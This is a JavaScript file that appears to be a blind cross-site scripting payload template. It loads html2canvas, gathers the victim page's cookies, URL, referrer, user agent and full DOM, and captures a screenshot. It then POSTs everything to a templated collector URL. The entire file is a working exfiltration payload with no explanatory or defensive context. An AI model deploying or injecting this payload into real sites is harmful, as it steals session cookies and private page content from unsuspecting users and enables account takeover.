
// IMPORT HTML TO CANVAS FOR SCREENSHOTS
script = document.createElement('script');
script.type = 'text/javascript';
script.async = true;
script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.7/dist/html2canvas.min.js";
script.onload=function(){
  collect();
};
document.getElementsByTagName('head')[0].appendChild(script);


function collect() {
  var collector = {};

  collector["Location"] = location.toString()
  collector["Cookies"] = document.cookie;
  collector["Referrer"] = document.referrer;
  collector["UserAgent"] = navigator.userAgent;
  collector["Origin"] = location.origin;
  collector["DOM"] = document.documentElement.outerHTML;

  html2canvas(document.body).then(function(canvas) {
          collector["Screenshot"] = canvas.toDataURL("image/png");
          var xhr = new XMLHttpRequest();
          xhr.open("POST", "{{.}}", true);
          xhr.setRequestHeader("Content-Type", "application/json");
          xhr.send(JSON.stringify(collector));
  });
}
